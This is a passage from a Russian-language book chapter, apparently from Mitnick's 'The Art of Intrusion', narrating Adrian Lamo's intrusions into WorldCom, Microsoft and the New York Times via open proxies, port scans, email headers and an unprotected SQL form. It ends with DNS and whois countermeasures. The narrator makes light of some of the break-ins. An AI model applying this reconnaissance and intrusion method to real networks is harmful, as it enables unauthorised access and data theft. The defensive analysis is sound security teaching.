посмотреть на их реальный прокси-сервер, один из тех, что он использовал для получения доступа.  «Мы посмотрели на э т о т сервер и они сказали мне: „А как вы бы обезопасили эту машину?“  Адриан уже знал, что сервер не используется для каких-то важных дел, это был просто «случайный сервер».  «Я вытащил мой перочинный ножик, один из самых простых, с лезвием для открывания бутылок. Я подошел к серверу, перерезал его кабель и сказал: „Теперь компьютер безопасен“.  «Они ответили: „Нам это подходит“. Инженер написал на бумаге „не соединять“ и прикрепил ее к серверу».  Адриан обнаружил доступ в сеть крупной компании при помощи одного компьютера, который уже давно перестал выполнять важные функции, но никто даже не заметил этого и не позаботился о том, чтобы удалить его из сети. «В любой компании», — говорит Адриан, — «есть множество подобных компьютеров, стоящих повсюду, соединенных с внешним миром и неиспользуемых». Каждый из них — потенциальная возможность для проникновения.   MCI WORLDCOM   Так же, как он поступал и с другими сетями, Адриана начал с атаки на прокси-сервер «королевства» WorldCom. Он начал поиск, используя свое любимое средство для навигации в компьютерных сетях, программу под названием ProxyHunter, которая локализует открытые прокси-серверы. Запустив эту программу на своем ноутбуке, он просканировал корпоративные Интернет-адреса WorldCom, быстро идентифицировал пять открытых прокси-серверов — один из них имел URL-адрес, заканчивающийся на world.com. Теперь ему нужно было только сконфигурировать свой браузер для того, чтобы использовать один из этих прокси, и он мог бы путешествовать по внутренней сети WorldCom так же свободно, как и любой сотрудник этой компании.  После проникновения во внутреннюю сеть он обнаружил и другие уровни безопасности, где для проникновения на Интернет-сайты нужны были пароли. Некоторые люди, я уверен, сочли бы удивительным, насколько внимательным старается быть атакующий типа А д —риана, и как много времени он готов провести в своих попытках проникновения и сеть компании. Через два месяца Адриан наконец решил, что пришла пора приступать к делу.  Он получил доступ к системе управления кадрами WorldCom, где узнал список имен и номеров социальной страховки для всех 86000 сотрудников. Обладая этой информацией и датой рождения человека (которую можно найти на сайте anybirthday.com), он получал возможность поменять пароль сотрудника, а также доступ к такой приватной информации, как заработная плата и контактные телефоны. Он мог даже добраться до депозитов сотрудников и переводить их заработную плату на свой счет. Он не соблазнился такой возможностью, но знал, что «куча народу не задумываясь разрушила бы город, чтобы получить несколько сотен тысяч долларов».   ВНУТРИ   MICROSOFT   Во время наших бесед Адриан ожидал приговора за несколько компьютерных преступлений: он рассказал историю, за которую его не судили, но она была включена в информацию, собранную следователями. Однако, не желая себе дополнительных сроков заключения, он чувствовал, что должен быть особенно осторожным, рассказывая историю о Microsoft. Надо держать язык за зубами. объяснял он, и везде где только можно вставлял слова «как мне приписывают».  «Я могу рассказать, что мне приписывают. По их словам, я обнаружил (как мне приписывают) Интернет сайт, на который можно входить без авторизациии, на нем не было указания, что это секретный сайт и на нем не было ничего, кроме функции поиска».  Даже этому «королю» программирования не всегда удается держать свои компьютеры в безопасности.  Введя имя, Адриан (как ему приписывают!) обнаружил детальный список онлайн-заказов пользователей. По словам представителей правительства, говорит Адриан, этот сайт содержал информацию о заказах и их выполнении для всех, кто когда-либо заказывал что-нибудь на Интернет-сайте Microsoft, там же содержалась информация о тех случаях, когда кредитные карточки не были приняты к оплате. Совершенно недопустимо было, чтобы такая информация вышла за пределы компании.  Адриан объяснил детали взлома системы безопасности Microsoft журналисту из The Washington Post, которому он доверял, выдвинув свои обычные условия, что ничего не будет опубликовано до тех пор, пока брешь не будет устранена. Журналист передал все детали в компанию Microsoft, где сотрудники ИТ-службы решили не воспринимать это послание как предупреждение. «Microsoft решил выдвинуть обвинение», —говорит Адриан. «Они оценили ущерб в большую сумму — сто тысяч долларов». Потом они передумали. Адриану было сказано, что компания Microsoft «потеряла этот счет». Обвинение во взломе сайта осталось, но без какой-либо суммы в долларах. (Из онлайновых архивов газеты The Washington Post следует, что издатель не счел все произошедшее достаточно интересным для публикации в газете, несмотря на то, что мишенью взлома была компания Microsoft, а всю информацию добыл их собственный сотрудник. Можно только удивляться такому решению).   ГЕРОЙ  ,   НО   НЕ   СВЯТОЙ  :   ПРОНИКНОВЕНИЕ   В   NEW YORK TIMES   Однажды Адриан сидел и читал New York Times, когда его озарила мысль, что можно найти пути для взлома компьютерной сети газеты. «У меня уже был доступ в The Washington Post», вспоминает он, но признает, что попытку нельзя назвать плодотворной, поскольку «там не нашлось ничего достаточно интересного».  Казалось, что Times представляет более сложную проблему для взломщика, поскольку они гораздо более остро воспринимают проблему безопасности в связи со ставшим широко известным несколько лет назад случаем хакерства, когда группа под названием H4G («Хакерство для девчушек») проникла на сайт газеты. Взломщики критиковали автора раздела «Технологии» в Times Джона Маркоффа за его статьи обо мне, статьи, которые внесли свой вклад в очень жесткое отношение ко мне со стороны Министерства юстиции.  Адриан вышел «на старт» и приступил к работе. Вначале он посетил Интернет-сайт и обнаружил, что тот находится на аутсорсинге, его поддерживают не сотрудники газеты, а некая сторонняя компания (ISP — Internet service provider). Это распространенная практика: суть ее в том, что даже проникнув на Интернет-сайт компании, хакер не получит доступа к его внутренней корпоративной сети. Для Адриана это означало лишь то, что придется поработать чуть старательнее, чтобы отыскать путь внутрь.  «У меня нет четкой стратегии», — говорит Адриан о своем подходе к взлому сайтов. «Когда я провожу разведку, то очень тщательно собираю информацию изо всех возможных источников». Другими словами, он не начинает атаку с немедленных попыток проникновения на Интернет-сайт компании, поскольку это может вызвать обратный удар, направленный на него. Вместо этого есть много полезных исследовательских инструментов, которые можно получить бесплатно в ARIN (American Registry for Internet Numbers — Американский регистр Интернет-номеров), организации, ответственной за управление нумерацией ресурсов Интернет в Северной Америке,  Набрав « N e w York Times» в окошечке « К т о » на сайте arin.net, он получил такой список информации:   \ New York Times (NYT-3)  NEW YORK TIMES COMPANY (NYT-4)  New York Times Digital (NYID)  New York Times Digital (AS21568) NYID 21568  NEW YORK TIMES COMPANY NEW-YORK84-79 (NET-12-160-79-0-1)  12.160.79.0 — 12.160.79.255  New York Times SBC068121080232040219 (NET-68-121 —80-232-1)  68.121.80.232 — 68.121.80.239  New York Times Digital PNAP-NYM-NYT-RM-01 (NET-64-94-185-0-1)  64.94.185.0 — 64.94.185.255   Группы из четырех номеров, разделенных точками, это IP-адреса, которые можно рассматривать как Интернет-аналог почтовых адресов с номером дома, названием улицы, города и т.п. Список, который показывает диапазон таких адресов (например, 12.160.79.0 — 12.160.79.255) называется «netblock».  Далее он провел поиск портов в диапазоне адресов, принадлежащих New York Times и сел передохнуть, пока программа сканировала адреса в поисках открытых портов, надеясь, что он отыщет несколько интересных систем, которые сможет атаковать. Ему это удалось. Проверяя целый ряд открытых портов, он обнаружил, что здесь также есть несколько систем, использующих неправильно сконфигурированные открытые прокси-серверы, позволяющие ему соединиться с компьютерами во внутренней сети компании.  Он заглянул на DNS газеты, надеясь найти IP-адрес, который не был бы передан на аутсорсинг и был бы внутренним адресом Times, но — без успеха. Затем он попытался извлечь все DNS-записи для домена nytimes.com. После завершения этой попытки он опять отправился на Интернет-сайт и в этот раз с большим успехом: он обнаружил место, которое предлагало визитерам список адресов электронной почты сотрудников Times, которые соглашались получать письма от читателей.  Буквально через минуту он получил письмо из газеты с запрошенным списком. Правда, это не был список адресов электронной почты репортеров, который он просил, но все равно это был полезный список. Заголовок на этом письме указывал, что оно пришло из внутренней сети компании, вдобавок был показан IP-адрес, который нигде в другом месте не публиковался. «Люди не понимают, что даже обычное электронное письмо может нести много полезной информации», — отмечает Адриан.  Внутренний IP-адрес дал ему возможность проникновения. Следующим шагом для Адриана стало проникновение через открытый прокси-сервер, который он уже обнаружил, и ручное сканирование IP-адресов в том же сегменте сети. Чтобы прояснить сказанное, давайте предположим, что есть адрес 68.121.90.23. Большинство атакующих начало бы сканирование с адреса 68.121.90.1 и продолжало бы, увеличивая последовательно последнее число на единицу до 68.121.90.254. Адриан же пытался поставить себя в положение ИТ-специалистов компании, создававших сеть: естественно предположить, что люди будут выбирать круглые номера, начиная с первого десятка— от .1 до .10, а затем, шагая десятками — .20, .30 и т.д.  Его попытки не увенчались успехом. Он обнаружил несколько внутренних Интернет-серверов, но ни на одном из них не было полезной информации. Случайно он заглянул на сервер, где хранился старый, больше не используемый внутренний Интернет-сайт Times, скорее всего заброшенный после ввода в работу нового сайта, а потом и забытый. Ему показалось это интересным, он внимательно просмотрел сайт и обнаружил link, то есть Интернет-адрес, который должен был идти к старому производственному сайту, а на самом деле вывел его к работающему производству.  Для Адриана это был настоящий «Священный Грааль». Ситуация становилась все более интересной, поскольку он открыл, что на этом компьютере хранились обучающие курсы для сотрудников на тему, как использовать систему. Это было похоже на то, как если бы школьнику за ночь перед сочинением предстояло прочесть «Войну и Мир», а ему попался бы в руки краткий конспект страниц на 50.  Адриану довелось проникать уже на множество сайтов, поэтому его эмоции от успеха на этом этапе были довольно сдержанными, и все же он проник гораздо дальше, чем ожидал. И ситуация могла стать еще лучше. Вскоре он открыл встроенное приложение для сотрудников, с помощью которого они могли найти путь на сайте. «Часто, — говорит он, — системные администраторы не конфигурируют такие приложения соответствующим образом и таким образом позволяют вам совершать поиск там, где это должно быть запрещено».  Именно это и произошло, Адриан называет случившееся спортивным термином «нокаут» или «чистая победа». Кто-то из системных администраторов Times поместил это приложение в одну из директорий, которая позволяла сделать то, что называется «SQL-запрос в свободной форме». SQL (Structured Query Language — структурированный язык запросов) — это язык для общения с большинством баз данных. После запроса появляется специальное диалоговое окно, которое позволяет Адриану ввести SQL-команды без авторизации, то есть он получает возможность проводить виртуальный поиск по всем базам данных системы и получать или изменять информацию по своему усмотрению.  Он определил, что компьютер, на котором были расположены почтовые сервера, использовал программы Lotus Notes. Хакеры знают, что более старые версии Notes дают возможность пользователю просматривать все базы данных в системе, и как раз эта часть сети Times использовала такую старую версию. База данных Lotus Notes, в которую проник Адриан, заставила его «сильно заволноваться, поскольку в ней содержались все сведения о каждом сотруднике, включая их заработную плату и номера социальных страховок». «Там содержалась информация о подписчиках. а также о тех, кто обращался в газету с жалобами или просьбами о помощи».  На вопрос о том, какая операционная система работала в Times, Адриан отвечает, что он не знает. «Я не анализировал сеть с этой точки зрения», — объясняет он.  «Дело не всегда заключается в технологии, чаще всего все бывает связано с людьми и с тем, как они конфигурируют сети. Большинство людей совершенно предсказуемы. Я часто обнаруживал, что люди строят сети одним и тем же образом, снова и снова.  Многие сайты электронной коммерции д е л а ю т э т у ошибку. Они предполагают, что все люди будут пользоваться сайтом одним и тем же образом. Никто не думает о том, что пользователь выйдет за пределы установленного пути».  Из-за этой предсказуемости опытный атакующий может разместить заказ на Интернет-сайте, пройти через весь процесс покупки до той точки, где его информация проверяется, затем вернуться и изменить биллинговую информацию. Он получает товары; кто-то другой получает счет на оплату этих товаров. (Хотя Адриан объяснил всю процедуру в деталях, он специально просил не приводить ее полного описания, что может дать возможность другим повторить ее).  Его мысль заключалась а том, что системные администраторы даже не пытаются поставить себя на место атакующих, что сильно облегчает жизнь последних. Именно это объясняет успех следующих шагов Адриана в его проникновении в компьютерную сеть Times. Внутренняя поисковая машина не должна была проводить поиск по всему сайту, но она делала это. Он обнаружил программу, которая предоставляла SQL-форму, дающую ему контроль над базами данных, включая написание запросов для извлечения информации. Ему еще надо было узнать имена баз данных в этой системе, в поисках тех, что представляли бы интерес. Именно таким образом он нашел очень интересную базу данных: она содержала таблицу имен и паролей для всех сотрудников The New York Times.  Оказалось, что большинство паролей представляют собой последние четыре цифры номера социальной страховки сотрудника. При этом компания даже не позаботилась использовать различные пароли для доступа в области, содержащие особенно важную информацию — один и тот же пароль пользователя действовал в любом месте системы. И, как подсказывает ему опыт, Адриан считает, что и сегодня пароли в Times не более безопасны, чем они были в момент его атаки.  «В конце концов, я смог войти в Интернет и получить доступ к дополнительной информации. Я смог войти на страницу новостей под именем редактора новостей, используя его пароль».  Он обнаружил базу данных, где были перечислены все люди, задержанные в США по обвинению в терроризме, включая и тех, чьи имена не были известны общественности. Продолжая свои исследования, он обнаружил базу данных всех тех, кто когда-либо написал хоть одно слово для первой страницы Times. В ней содержались тысячи имен с адресами, телефонами и номера страховок. Он начал искать имя «Кеннеди» и обнаружил несколько страниц информации. В базе данных содержалась контактная информация о знаменитостях и прочих выдающихся людях от профессоров Гарварда до Роберта Редфорда и Джека Николсона.  Адриан добавил в этот список свое имя и номер мобильного телефона (с кодом северной Калифорнии номер выглядел так «505-НАСК»). Он был уверен, что газета никогда не сможет определить, что список был изменен, и втайне надеялся, что какой-нибудь репортер или редактор захочет с ним пообщаться, поэтому он написал в графе профессия «компьютерное хакерство/безопасность и интеллектуальные коммуникации».  Да, действия Адриана можно считать неадекватными, может даже непростительными. Лично мне они кажутся не только безопасными, но и забавными. Меня до сих пор возбуждает идея Адриана позвонить от имени газеты какой-нибудь знаменитости: «Добрый день. это г-н Джексон? Это такой-то из газеты The New York Times». После чего можно было попросить его высказаться о чем-то или же написать шесть сотен слов о состоянии компьютерной безопасности или на какую-нибудь не менее актуальную тему и на следующий день увидеть свой текст на первой странице самой влиятельной в стране газеты.  Можно еще долго рассказывать сагу «Адриан и The New York Times», но, к сожалению, дальше рассказ становится печальным. То, о чем пойдет речь, не было необходимым, это не характерно для Адриана, но именно это привело к серьезным проблемам. После проникновения в базу данных он обнаружил, что у него есть доступ к подписке Times на услуги компании LexisNexis — онлайновым платным услугам по предоставлению новостной информации.  Как указано в правительственном обвинении, он создал пять отдельных аккаунтов и сделал более трех тысяч запросов.  После трех месяцев «путешествий» по закромам LexisNexis, в течение которых The New York Times оставалась в полном неведении, что ее база данных взломана, Адриан решил перейти к практике в стиле Робин Гуда, чем характеризовались все его предыдущие атаки на другие компании. Он связался с известным Интернет-журналистом (как и я, бывшим хакером) и рассказал о лазейке, которую он использовал для проникновения в компьютерную систему The New York Times — при этом он предварительно получил согласие, что журналист не будет публиковать информацию о взломе, пока предварительно не свяжется с Times и не дождется, что они устранят проблему.  Журналист рассказал мне, что когда он связался с Times, переговоры пошли совсем не таким путем, как ожидали они с Адрианом. Руководство Times, по его словам, не заинтересовалось тем, что он говорил им, не захотело воспользоваться информацией, которую он предложил, не захотело общаться непосредственно с Адрианом, чтобы познакомиться с деталями и пожелало решать проблему самостоятельно. Представитель Times даже не захотел узнать, какой способ доступа был применен и согласился записать подробности только после того, как журналист настоял на этом.  Сотрудники газеты проверили лазейку и в течение 48 часов устранили ее. Но руководство Times даже не подумало поблагодарить человека, который привлек их внимание к существующей у них проблеме безопасности. Более ранняя атака группы «Хакерство для девчушек» очень широко освещалась в прессе, но люди, ответственные за нее, никогда не были пойманы. (Не думайте, что я имею какое-то отношение к этой атаке: в то время я уже был в заключении. ожидая суда). Понятно, что после первой атаки сотрудники ИТ-службы Times попали под очень большое давление, чтобы обеспечить в дальнейшем безопасность от хакерских взломов. Безнаказанные путешествия Адриана по их компьютерной сети наверняка уязвили чье-то самолюбие, нанесли урон чьим-то репутациям, чем и можно объяснить бескомпромиссность сотрудников газеты, узнавших, что он пользовался их непреднамеренной добротой в течение месяцев.  Вообще-то, сотрудники Times могли бы проявить благодарность за то, что им дали время устранить зияющие дыры в их системе безопасности, прежде, чем известие о том, что их сеть полностью открыта распространилось в печати. Вероятно, информация об использовании LexisNexis сделала их настолько несговорчивыми. Однако, каковы бы ни были причины, руководство Times сделало то, чего раньше не делала ни одна из жертв Адриана — они обратились в ФБР.  Через несколько м е с я ц е в Адриан услышал, что ФБР и щ е т его и и с —чез. Агенты ФБР начали навещать его семью, друзей и приятелей. все сужая круги, и пытаясь обнаружить, не оставил ли он кому-нибудь из своих приятелей-журналистов каких-то сведений о своем местонахождении. Нескольких журналистов, с которыми Адриан делился информацией, вызвали повестками в суд. «Игра», как написал один из журналистов, «внезапно стала гораздо серьезней».  Адриан объявился через пять дней. Для собственной капитуляции он выбрал одно из своих любимых рабочих мест — кофейню Sturbucks.  После того, как пыль осела, офис Прокурора США по Южному району Нью-Йорка опубликовал пресс-релиз, в котором было сказано, что «за хакерское проникновение на сайт New York Times Адриану Ламо предъявлен иск на триста тысяч долларов». Его бесплатное скачивание информации с сайта LexisNexis, по данным правительства, составило 18% от всех обращений на этот сайт из New York Times с момента проникновения туда Адриана.  Правительство основывало свои расчеты на том, какой должна быть плата для индивидуального пользователя, который не является подписчиком LexisNexis. В этом случае стоимость одного поиска может достигать двенадцати долларов. Если даже проводить расчет на основе этого неразумного предположения, то Адриану пришлось бы делать по двести семьдесят запросов информации ежедневно в течение трех месяцев, чтобы достичь указанной цифры. Кроме того, такие крупные организации, как Times, платят ежемесячную плату за неограниченный доступ к информации LexisNexis, поэтому за все поиски Адриана они не заплатили ни одного дополнительного цента!  По словам Адриана, случай с New York Times является исключением в его хакерской карьере. Он говорит, что получал благодарности, как от excite@home, так и от MCI Worldcom (что было особенно приятно после того, как он подтвердил, что мог сделать переводы с депозитов тысяч сотрудников на свой счет). Адриан не был расстроен, но просто констатировал факт, говоря, что «The New York Times стала единственной компанией, которая захотела видеть меня заключенным».  Чтобы еще усугубить его ситуацию, правительство рекомендовало прежним жертвам Адриана подготовить оценку вреда, которую он нанес им, включая даже те компании, которые поблагодарили его за предоставленную информацию. И это не удивительно: просьба о сотрудничестве со стороны ФБР или государственных следователей является тем, что большинство компаний не может игнорировать, даже если они имеют иное мнение об обсуждаемой проблеме.   УНИКАЛЬНОСТЬ   ТАЛАНТА   АДРИАНА   Совершенно нетипично для хакера, но Адриан не был знатоком ни одного языка программирования. Его успех базировался на умении анализировать то, как думают люди, как они создают системы. какие процессы используют сетевые и системные администраторы для создания сетевой архитектуры. Хотя, по его словам, у него плохая оперативная память, он выявлял лазейки, пробуя Интернет-приложения компании, чтобы найти доступ в ее сеть, затем он путешествовал по сети, создавая в своем мозгу ее структуру из отдельных кусочков, до тех пор, пока не проникал в один из уголков сети, который. по мнению создателей, был упрятан в темноте недоступности и поэтому защищен от атак.  Вот его собственное описание проникновения сквозь границы защиты в неизведанное:  «Я верю, что есть много общего во всех компьютерных системах, в любой точке планеты. Мы отыскиваем эти общие места среди кажущейся индивидуальности систем. Е с л и вы сможете разгадать смысл этих построений, то это может вам помочь и привести вас в странные места. Хакерство всегда было для меня не столько технологией, сколько религией».  Адриан считает, что если он продуманно поставит перед собой задачу проникновения в определенные участки системы, то скорее всего потерпит неудачу. Если же он раскрепостит свою фантазию, и будет руководствоваться, в основном, интуицией, то он окажется там, где хотел оказаться.  Адриан не считает свой подход уникальным, но говорит, что никогда не встречал другого хакера, который бы преуспел на этом пути. «Одна из причин того, что ни одна из этих компаний, тратящих тысячи и тысячи долларов на выявление вторжений, не обнаружила меня, заключается в том, что я не делаю того, что делают нормальные хакеры. Когда я нахожу сеть, открытую для вторжения, я смотрю на нее так, как это следует делать. Я думаю: „Ну хорошо, у сотрудников есть доступ к информации о пользователях. Е с л и бы я б ы л сотрудником, ч т о бы я попросил систему сделать?“ Для системы тяжело отличить законную активность от незаконной, поскольку вы проходите через тот же интерфейс, что и сотрудники, Э т о т о т же самый трафик».  Однажды Адриан выстроил в голове структуру сети. «Это менее всего связано с числами на экране и гораздо больше с ощущением того, что ты находишься где-то внутри, чувствуя всю ее архитектуру. Это способ видеть, особый взгляд на реальность. Я не могу описать это, но я вижу это в голове. Я замечаю, что и где живет, как все это взаимосвязано и взаимодействует. И множество раз все это приводило меня к тому, что люди называют волшебством».  Во время его интервью на передаче ночных новостей канала NBC в Вашингтоне, ведущий шутливым тоном предложил Адриану попытаться взломать систему NBC. Тот ответил в прямом эфире, что через пять минут на его экране будет конфиденциальная информация этой компании.  Адриан старался смотреть на любую систему с двух точек зрения, как сотрудник и как внешний пользователь. По его мнению, именно этот «бинокулярный» взгляд подсказывает его интуиции, куда двигаться дальше. Он играет роль обычного служащего, выполняющего какую-то задачу, размышляющего и двигающегося вперед в определенном направлении. Его метод работает настолько хорошо, что люди давно перестали относиться к его невероятным успехам, как к случайным удачам.   ПРОСТАЯ   ИНФОРМАЦИЯ   Однажды ночью в одной из кофеен Sturbucks, где мы как-то пили с ним, Адриану пришлось навострить уши. Он сидел там за чашечкой кофе, когда к кофейне подъехал автомобиль и из него вышли пять человек. Они присели за соседний столик, он слышал их разговор; быстро стало ясно, что они работают в правоохранительных органах, он был уверен, что они из ФБР.  «Они беседовали около часа, совершенно не обращая внимания на то, что я сижу, не притрагиваясь к своему кофе. Разговор был абсолютно нейтральный — кому что нравится или не нравится. Есть такая шутка, что о мощи организации можно судить по размеру визитных карточек и нагрудных „бейджей“, которые носят ее сотрудники. У сотрудников Ф Б Р очень маленькие „бейджи“, тогда как у сотрудников рыбного департамента — просто огромные. Поэтому, на самом деле можно говорить об обратной пропорциональности. Эти ребята так забавлялись…»  Выходя из кофейни, агенты бросили на него беглый взгляд, как будто они только что заметили молодого человека, уставившегося в чашку холодного кофе и возможно услышавшего то, что не предназначалось для его ушей.  В следующий раз Адриан смог при помощи одного-единственного звонка отыскать важную информацию об AOL (America On-Line — крупнейший Интернет-провайдер США.  прим. переводчика ).  Их ИТ-система была прекрасно защищена, но он отыскал лазейку, когда позвонил в компанию, которая производила и прокладывала все кабели для AOL. Адриан утверждал, что обладает всеми картами прокладки кабелей. «Они поняли, что если вы додумались позвонить им, то с вами можно иметь дело». Хакер мог бы вызвать такие нарушения, которые могли стоить AOL миллионы долларов из-за простоев и ремонтных работ.  Звучит устрашающе. Адриан и я пришли к единому мнению, что можно только удивляться тому, как беззаботно люди относятся к информации.   СОВРЕМЕННОСТЬ   Летом 2004 года Адриан Ламо был приговорен к шести месяцам домашнего заключения и двум годам условного заключения. Суд приговорил его к уплате шестидесяти пяти тысяч долларов в качестве возмещения ущерба его жертвам. Учитывая возможные заработки Адриана и полное отсутствие капиталов (на данный момент он даже не имеет жилья), этот размер компенсации является совершенно губительным. При определении размера компенсации суд должен был бы принимать во внимание целый ряд факторов, включая нынешнюю и будущую возможности обвиняемого расплатиться, а также и реальные потери жертв. Приговор о возмещении ущерба не должен быть уничтожающим. По моему мнению, судья и не задумывался о реальности выплаты такой большой суммы Адрианом, но просто назначил ее в качестве устрашающего послания другим хакерам, поскольку случай Адриана широко освещался в прессе.  Тем временем Адриан занялся собственной реабилитацией, обратив свои таланты на свою собственную жизнь. Он поступил на курсы журналистов в колледже Сакраменто: он начал писать статьи для местной газеты и подрабатывать внештатно для других изданий. «На мой взгляд, журналистика — лучшая карьера, которую я мог бы выбрать, и которая доставляла бы мне удовольствие — в ней есть любознательность, стремление взглянуть на вещи с необычной стороны, желание узнать больше об окружающем нас мире. Совершенно такие же мотивы привели меня к хакерству».  Я надеюсь, Адриан честен со мной и с собой, когда говорит о новом курсе своей жизни.  «Я солгал бы, если б сказал, что могу поверить в полную перемену человека за одну ночь. Я не могу потерять свое любопытство за ночь, но я могу использовать его таким путем, чтобы не наносить ущерба другим людям. Поскольку главное, что я вынес из всего случившегося, — это то, что за сетями стоят реальные люди. Я на самом деле не смогу больше заниматься хакерством и не думать о тех людях, которым придется беспокоиться о моих попытках ночи напролет,  Я думаю, что журналистика и фотография для меня служат интеллектуальным аналогом криминальных действий. Они дают пищу моему любопытству, позволяют мне взглянуть на вещи иначе, дают возможность развиваться в русле законопослушности».  Он рассказал мне и о своих планах работать внештатным автором для Network World. Они уже связывались с ним, и хотели, чтобы он был для них источником информации: он предложил им идею — вместо своих интервью вести у них постоянную колонку. Издатель согласился. Таким образом, вместе с информацией для хакеров появятся его тексты для сетевых администраторов.  «Журналистика — э т о то, чем я хотел бы заниматься. Я чувствую, что могу сделать что-то необычное и это не совсем то, что вы получаете от работы в области безопасности. Безопасность — это такая отрасль индустрии, которая во многом зависит от человеческих страхов и незнания компьютеров и технологий. Журналистика в значительно большей степени имеет отношение к правде.  Хакерство — это уникальное самовыражение человека. Оно включает в себя сосредоточение огромной потенциальной власти в руках одного человека, власти, которой обычно пользуются только правительство или крупный бизнес. Мысль о том, что несколько подростков могут отключить энергосистему страны приводит в ужас представителей правительства. И это вполне понятно».  Он не считает себя хакером, взломщиком или атакующим. «Я хотел бы процитировать Боба Дилана: „Я не проповедник и не торговец. Я просто делаю то, что делаю“. Я счастлив, когда люди понимают или хотя бы стремятся понять это».  Адриан говорит, что ему предлагали хорошие должности в военных и государственных учреждениях. Он отказался от этих предложений. «Многим людям нравится заниматься сексом, но далеко не каждый готов зарабатывать этим».  В этом весь Адриан — думающий хакер.   АНАЛИЗ   Что бы вы ни думали о позиции и действиях Адриана Ламо, хотелось бы думать, что вы согласитесь со мной по поводу несправедливости определения нанесенного им вреда федеральными органами.  Я знаю из своего опыта, как правоохранительные органы вычисляют предположительную сумму ущерба в хакерских случаях. Первый способ — получить сведения от компаний, которые переоценивают свои потери в надежде заставить хакера раскошелиться и не доводить дело до суда. В процессе разбирательства адвокат и прокурор обычно сходятся на несколько меньшей сумме: по федеральным законам, чем больше ущерб, тем более долгий срок заключения ожидает хакера.  В случае, произошедшем с Адрианом, Прокурор США проигнорировал тот факт, что именно от него компании узнавали о собственной уязвимости. Каждый р а з он з а щ и щ а л компании, указывая им на ту или иную прореху в их системе безопасности, и ожидал, пока они ликвидируют проблему, чтобы лишь потом опубликовать новость о своем удачном взломе. Да, он нарушал закон, но он действовал (во всяком случае, в ставших известными случаях) абсолютно этично.   КОНТРМЕРЫ   Подход, используемый атакующими, в том числе и Адрианом, заключается в запуске запроса «Кто это», что может помочь отыскать немало ценной информации, содержащейся в четырех NIC (Network Information Center — центр сетевой информации), покрывающих различные географические районы мира. Большинство информации в этих базах данных является общедоступными сведениями, которые может узнать любой пользователь приложения «Кто это» или посещающий Интернет-сайт, предлагающий подобные услуги, или заходящий на сайт nytimes.com.  Предоставляемая информация может содержать имя, адрес электронной почты, физический адрес и телефонный номер административных и технических контактов для этого домена. Эта информация вполне может использоваться для атак с использованием методов социальной инженерии (см. Главу 10, «Социальные инженеры — как они работают и как их остановить»). Кроме того, это может навести на мысль о структуре адресов электронной почты и имен пользователей в компании. Например, если адрес электронной почты одного из сотрудников Times выглядит, как  hilda@nytimes.com  , естественно предположить, что и многие другие сотрудники Times используют свое имя для адресов электронной почты, а также и для подписи.  Как видно из истории атаки Адрианом газеты The New York Times, он так же получил ценную информацию об IP-адресах и сетевых блоках газеты, что легло в основу успеха его атаки.  Чтобы ограничить утечку информации, любой компании было бы полезно хранить список телефонов компании только на ее телефонной станции, а не делать его доступным всем желающим. Сотрудники в приемной компании, отвечающие на телефонные звонки, должны проходить специальную подготовку, чтобы они могли быстро распознавать атаки социальных инженеров. Кроме того, в качестве адреса электронной почты следует приводить адрес издательства, а не список личных адресов сотрудников.  Более того: сегодня компаниям позволено не обнародовать свою контактную информацию и имя домена — они не должны теперь предоставляться любому желающему по первому требованию. По специальному запросу список адресов вашей компании может быть засекречен, что затруднит проникновение атакующих.  Еще одна полезная мысль высказана в приведенной истории: следует использовать горизонтально разделенные DNS. Это означает, что нужно организовать внутренний DNS-сервер. который определяет имена пользователей во внутренней сети, в то время как внешний DNS-сервер будет содержать имена для использования внешними пользователями.  В качестве другого метода разведки хакер запрашивает DNS, чтобы выяснить, на каких операционных системах работают компьютеры компании, а также чтобы получить информацию о структуре всего домена. Эта информация очень полезна при координации усилий в ходе дальнейшей атаки. База данных DNS может содержать сведения обо всех узлах сети (HINFO — Host Information). Сетевой администратор должен всячески избегать появления HINFO-записей на любом публично доступном DNS-сервере.  Еще один из хакерских приемов основан на использовании операции под названием «перенос зоны» (zone transfer). (Адриан рассказывал, что использовал этот метод в своих атаках на сайты The New York Times и excite@home, но оба раза неудачно). Для защиты данных первичный DNS обычно конфигурируется так, чтобы позволить другим авторизованным серверам копировать DNS-записи из конкретных доменов; этот процесс копирования называется переносом зоны. Если первичный сервер сконфигурирован неправильно, атакующий может запустить процесс переноса зоны на любой указанный им компьютер, и таким образом получить подробную информацию обо всех именах узлов и связанных с ними IP-адресов домена.  Для защиты от такого типа атак необходимо разрешить перенос зоны только между определенными компьютерами, это необходимо для нормального ведения бизнеса. Более подробно: первичный DNS-сервер должен быть сконфигурирован так, чтобы позволять перенос только на проверенные вторичные DNS-сервера.  Вдобавок к этому по умолчанию необходим межсетевой экран, чтобы блокировать доступ к ТСР-порту 53 на любом корпоративном сервере. Еще одно правило межсетевого экрана должно разрешать проверенным вторичным серверам имен соединяться с ТСР-портом 53 и инициировать перенос зоны.  Компании должны максимально затруднить атакующим использование т е х н и к и обратного просмотра DNS. До тех пор, пока удобно использовать имена узлов, которые дают понять, какой из узлов для чего используется — такие имена, как database.CompanyX.com — очевидно, что это упрощает хакеру поиск нужно системы, достойной его атаки.  Другая техника сбора информации на основе обратного просмотра DNS содержит использование словаря и атаки грубой силы. Например, если вы собираетесь атаковать домен kevinmitnick.com, то словарная атака будет добавлять любое слово из него к имени домена в виде «слово».kevinmitnick.com, чтобы выявить другие узлы на этом домене. Обратная DNS-атака грубой силы гораздо сложнее, здесь на месте слова из словаря стоит последовательность букв и цифр, которая с каждой новой попыткой меняется на единицу или на новую букву. Чтобы заблокировать этот метод корпоративный DNS-сервер должен быть так сконфигурирован, чтобы устранить возможность публикации любого внутреннего имени узла. Внешний DNS-сервер может использоваться вместе с внутренним таким образом, чтобы внутренние имена узлов не могли «утечь» в другую сеть. В дополнение к этому, использование раздельных внутреннего и внешнего серверов имен помогает справиться с проблемой, упомянутой выше, касающейся имен узлов: внутренний DNS-сервер. защищенный от внешнего взгляда с помощью межсетевого экрана, может использовать такие имена узлов как  databas, research и  backup с небольшим риском.  Адриан смог получить ценную информацию о сети The New York Times, изучая заголовки электронных писем, получаемых из газеты, которые дали ему внутренние IP-адреса. Хакеры сознательно инициируют получение электронных писем, чтобы получить информацию такого рода, или просматривают общедоступные ленты новостей с электронными письмами с той же целью. Информация, появляющаяся в заголовке письма может дать знающему человеку немало полезной информации, например то, как происходит образование имен внутри компании, внутренние IP-адреса и путь, по которому прошло электронное письмо. Чтобы оградить себя от подобной утечки информации, компаниям рекомендуется так сконфигурировать их SMTP-серверы, чтобы отфильтровывать любую внутреннюю информацию — IP-адреса или 